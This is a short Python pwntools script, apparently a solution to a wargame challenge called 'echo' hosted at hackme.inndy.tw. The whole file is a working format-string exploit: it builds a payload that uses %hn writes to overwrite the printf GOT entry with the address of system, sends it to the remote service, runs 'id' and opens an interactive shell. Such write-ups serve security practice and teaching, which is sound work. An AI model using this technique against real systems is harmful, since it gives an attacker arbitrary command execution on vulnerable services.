import struct
from pwn import *
import telnetlib

#SYSTEM = 0x8048400
#PRINTF = 0X804a010
PRINTF = struct.pack("I", 0x804a010)
PRINTF1 = struct.pack("I", 0x804a010 + 1)
PRINTF2 = struct.pack("I", 0x804a010 + 2)
PRINTF3 = struct.pack("I", 0x804a010 + 3)

init_len = 8
count1 = 0x0804 - init_len
count2 = 0x8400 - 0x0804
count3 = 0 
count4 = 0

payload = PRINTF2 + PRINTF
payload += '%{}x'.format(count1)
payload += '%7$hn'
payload += '%{}x'.format(count2)
payload += '%8$hn'
#payload += '%{}x'.format(count3)
#payload += '%9$n'
#payload += '%1${}x'.format(count4)
#payload += '%10$n\n'

print payload + '\nid'

#s = process('./echo')
s = remote('hackme.inndy.tw', 7711)
s.send(payload)

s.send('id')
s.interactive()
